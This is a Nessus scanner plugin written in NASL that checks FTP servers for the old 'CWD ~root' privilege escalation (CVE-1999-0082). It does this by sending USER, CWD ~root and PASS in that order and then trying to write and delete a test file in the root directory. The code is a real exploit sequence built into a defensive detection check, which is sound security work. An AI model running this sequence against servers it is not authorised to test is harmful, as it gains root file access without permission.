#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10083);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-1999-0082");
 script_xref(name:"OSVDB", value:"73");
 script_name(english:"Multiple FTP CWD ~root Command Privilege Escalation");
 script_summary(english:"Attempts to get root privileges");

 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is susceptible to a command privilege 
escalation attack.");
 script_set_attribute(attribute:"description", value:
"The remote FTP server is affected by a flaw that may allow a remote
attacker to gain unauthorized privileges. An attacker can exploit this
by issuing a specially crafted request to the CWD ~root command." );
 script_set_attribute(attribute:"solution", value:
"Disallow ftp login for root and make sure root's home directory is not
world readable." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?78eedaee" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

 script_end_attributes();

 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
	
 script_family(english:"FTP");
 script_dependencie("find_service1.nasl", "ftp_anonymous.nasl", "ftp_root.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#


include("ftp_func.inc");
include("global_settings.inc");


if ( report_paranoia < 2 ) exit(0); 

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);


wri = get_kb_item("ftp/writeable_root");
# It the root directory is already writeable, then 
# we can't do the test
if(wri)exit(0);

if(login)
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 b = ftp_recv_line(socket:soc);
 d = string("USER ", login, "\r\n");
 send(socket:soc, data:d);
 b = ftp_recv_line(socket:soc);
 
 d = string("CWD ~root\n");
 send(socket:soc, data:d);
 b = ftp_recv_line(socket:soc);
 
 d = string("PASS ", password, "\r\n");
 send(socket:soc, data:d);
 b = ftp_recv_line(socket:soc);
 
 
 data = string("CWD /\r\n");
 send(socket:soc, data:data);
 a = ftp_recv_line(socket:soc);

 port2 = ftp_pasv(socket:soc);
 if(!port2)exit(0); # ???
 soc2 = open_sock_tcp(port2);
 if ( ! soc2 ) exit(0);
 data = string("STOR .nessus_test_2\r\n");
 send(socket:soc, data:data);
 r = recv_line(socket:soc, length:3);
 close(soc2);
 if(r == "425")
  {
   data = string("DELE .nessus_test_2\r\n");
   send(socket:soc,data:data);
   ftp_recv_line(socket:soc);
   security_hole(port);
   set_kb_item(name:"ftp/root_via_cwd", value:TRUE);
  }
data = string("QUIT\r\n");
send(socket:soc, data:data);
ftp_recv_line(socket:soc);
close(soc);
 }
}
